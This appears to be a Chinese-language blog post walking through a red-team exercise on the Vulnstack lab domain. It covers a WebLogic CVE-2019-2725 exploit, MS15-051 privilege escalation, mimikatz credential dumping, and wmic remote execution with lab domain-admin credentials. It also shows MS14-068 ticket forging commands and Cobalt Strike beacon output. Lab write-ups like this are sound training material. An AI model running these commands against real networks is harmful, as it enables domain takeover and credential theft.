---
layout:     post
title:    域渗透-Vulnstack靶机学习  
subtitle:   域渗透学习
date:       2019-12-08
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - 内网渗透
---
# 域渗透-Vulnstack靶机学习  

### 简介
vlunstack是红日安全团队出品的一个实战环境，具体介绍请访问：[http://vulnstack.qiyuanxuetang.net/vuln/detail/3/](http://vulnstack.qiyuanxuetang.net/vuln/detail/3/)  
基本结构：   
内网网段：10.10.10.1/24  
DC
IP：10.10.10.10  
系统：Windows 2012(64)  
应用：AD域  
WEB  
IP：10.10.10.80  
应用：Weblogic 10.3.6，MSSQL 2008  
PC  
IP：10.10.10.201  
基本拓扑：  
![191208_1](/img/191208_network.png)  
注意：WEB机器的服务要手动开启，运行C:\Oracle\Middleware\user_projects\domains\base_domain\startWebLogic.bat。  

### 外网  
已经知道了是7001的weblogic，就免过一些扫描端口的步骤了。  
直接访问web。  
![191208_2](/img/191208_weblogic.png)  
试了下常见的如weblogic/weblogic的弱口令，无果。掏出工具扫一下，看看存不存在对应的漏洞。  
![191208_3](/img/191208_weblogicscan.png)  
存在一个CVE-2019-2725，上github上找找有没有对应的exp。  
找到一个以后测试一下，没有问题。   
![191208_4](/img/191208_whoami.png)  
尝试返回一个beacon或者msf的会话，简单测试都不行。看了下有360.  
![191208_5](/img/191208_360.png)  
直接要远程下载payload的姿势很多都被ban了。只能重新上传shell，通过shell上传payload。  
这不是重点，所以我是直接360放行了的下载，payload是免杀过的。  
  
### 内网  
一共就三台机器，这里就略去了刺探扫段的过程。  
重新整理下WEB机器的信息。  
根据ipconfig /all中DNS并不难看出10.10.10.10是域控。  
![191208_6](/img/191208_DCip.png)  
确认下：  
![191208_7](/img/191208_DCip2.png)  
没问题，查下域管账户。  
![191208_8](/img/191208_DCadmin.png)  

#### 提权
直接尝试先把会话派生给msf。  
![191208_9](/img/191208_spawn.png)   
直接getsystem失败了,算了放弃用msf提权了，用了cs的拓展脚本elevatekit，ms15-051直接提权。  
![191208_10](/img/191208_ms15051.png)  
#### 读密码
mimikatz导出下：  
![191208_11](/img/191208_mimikatz.png)  

#### 打域控
尝试了pth，看起来失败了对吧。    
![191208_12](/img/191208_pth.png)  
但是再一看能访问域控上的资源了，直接IPC$连接。  
![191208_13](/img/191208_ipc.png)  
直接用copy命令把payload传上去。  
![191208_14](/img/191208_copy.png)  
然后用wmic去执行。   
```
shell wmic /node:10.10.10.10 /user:de1ay /password:1qaz@WSX process call create "c:\windows\temp\1.exe"
```
很遗憾发现不出网。  
可以用隧道出来，但是要重新生成paylaod。  
这个时候用cs的一个特殊的beacon，smb beacon。  
创建一个新监听->smb，然后选择已有beacon派生。    
![191208_15](/img/191208_spawnsmb.png)  
然后会连接一个beacon。  
![191208_16](/img/191208_smbbeacon.png)  
再用这个去连接域控，可以成功返回beacon了。  
![191208_17](/img/191208_DCbeacon.png)  
然后就是导hash一条龙。  

#### 全穿
emmm在登录pc的过程中有点问题，一直返回不了beacon，但是已经有域控了其实都是一样的。这里就不再演示了。    

### MS14-068
因为前面比较巧合，刚好在web机器上读取到了有域管权限de1ay的账号密码，假定没有的话，通过mssql账号去拿域控则需要通过ms14-068去完成。  
这里我就简单讲一下，用到工具[ms14-068利用工具](https://github.com/mubix/pykek)，[KrbCredExport](https://github.com/rvazarkar/KrbCredExport)将ccache转换成ticket。  
前者使用命令：
```
python ms14-068.py -u mssql@de1ay.com -s SID -p 1qaz@WSX -d 10.10.10.10
```
然后在CS中执行：  
```
kerberos_ticket_purge  #清空票据
kerberos_ticket_use  mssql.ticket
```
然后就可以访问了，也是有了域管权限了。  
```
beacon> shell dir \\DC.de1ay.com\C$\
[*] Tasked beacon to run: dir \\DC.de1ay.com\C$\
[+] host called home, sent: 65 bytes
[+] received output:
 驱动器 \\DC.de1ay.com\C$ 中的卷没有标签。
 卷的序列号是 92FD-8733

 \\DC.de1ay.com\C$ 的目录

2019/09/08  18:57    <DIR>          101cde781c961a208b
2019/12/04  20:39            10,240 downloader.exe
2013/08/22  23:52    <DIR>          PerfLogs
2019/12/08  15:53    <DIR>          Program Files
2013/08/22  23:39    <DIR>          Program Files (x86)
2019/09/09  10:47    <DIR>          Users
2019/12/08  18:47    <DIR>          Windows
               1 个文件         10,240 字节
               6 个目录 54,577,033,216 可用字节

```

### 总结
有些地方都是太取巧了，实际中会更困难，但是用来学习下这个域渗透的基本流程还是可以的。没有涉及到权限维持的内容。这个内容在平常的更新中还会补充几个常用的方式。    